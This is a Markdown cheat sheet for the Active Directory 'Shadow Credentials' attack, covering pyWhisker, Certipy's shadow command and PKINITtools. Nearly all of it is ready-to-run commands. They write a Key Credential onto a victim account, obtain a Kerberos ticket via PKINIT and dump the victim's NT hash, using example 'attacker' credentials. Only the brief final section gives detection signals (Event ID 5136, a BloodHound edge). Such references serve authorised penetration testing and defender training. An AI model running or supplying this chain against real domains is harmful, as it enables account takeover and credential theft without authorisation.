# Shadow Credentials Tooling Reference

## pyWhisker (https://github.com/ShutdownRepo/pywhisker)

Invocation: `python3 pywhisker.py [auth] --target <obj> --action <action> [opts]`

| Flag | Meaning |
|------|---------|
| `-d DOMAIN` | Target domain (FQDN) |
| `-u USER` | Controlled username |
| `-p PASSWORD` | Password |
| `-k` / `--no-pass` | Kerberos auth (uses KRB5CCNAME) |
| `-H LM:NT` | Pass-the-hash |
| `--target NAME` | Target user/computer whose attribute is modified |
| `--action list` | Enumerate existing Key Credentials |
| `--action add` | Generate key pair, write Key Credential |
| `--action remove` | Remove one Key Credential by `--device-id` |
| `--action clear` | Remove all Key Credentials |
| `--action info` | Show details of a Key Credential |
| `--filename NAME` | Output PFX/PEM base name |
| `--export PEM|PFX` | Output format (default PFX) |
| `--device-id GUID` | Target device for remove/info |
| `--dc-ip IP` | Domain Controller IP |
| `--use-ldaps` | Use LDAPS (636) |

### Example
```bash
python3 pywhisker.py -d corp.local -u attacker -p 'Passw0rd!' \
    --target victim --action add --filename victim_shadow
```

## Certipy `shadow` (https://github.com/ly4k/Certipy)

| Command | Meaning |
|---------|---------|
| `certipy shadow auto` | Add → PKINIT → dump NT hash → cleanup (end to end) |
| `certipy shadow add` | Add Key Credential only |
| `certipy shadow list` | List Key Credentials |
| `certipy shadow clear` | Clear Key Credentials |
| `certipy shadow info` | Show Key Credential info |

Key flags: `-u USER@DOMAIN`, `-p PW` / `-hashes :NT` / `-k -no-pass`,
`-dc-ip IP`, `-account TARGET` (use trailing `$` for computers), `-ns IP`, `-dns-tcp`.

### Example
```bash
certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' \
    -dc-ip 10.0.0.100 -account 'WS01$'
```

## PKINITtools (https://github.com/dirkjanm/PKINITtools)

| Script | Purpose |
|--------|---------|
| `gettgtpkinit.py -cert-pfx FILE -pfx-pass PW DOMAIN/USER out.ccache` | Request TGT via PKINIT; prints AS-REP key |
| `getnthash.py -key <AS-REP-KEY> DOMAIN/USER` | Recover NT hash (KRB5CCNAME set) |

### Example
```bash
python3 gettgtpkinit.py -cert-pfx victim_shadow.pfx -pfx-pass abc123 \
    corp.local/victim victim.ccache
export KRB5CCNAME=victim.ccache
python3 getnthash.py -key <AS-REP-KEY> corp.local/victim
```

## Detection signal
- Event ID 5136 — modification of `msDS-KeyCredentialLink` (Directory Service Changes auditing).
- BloodHound edge: `AddKeyCredentialLink`.
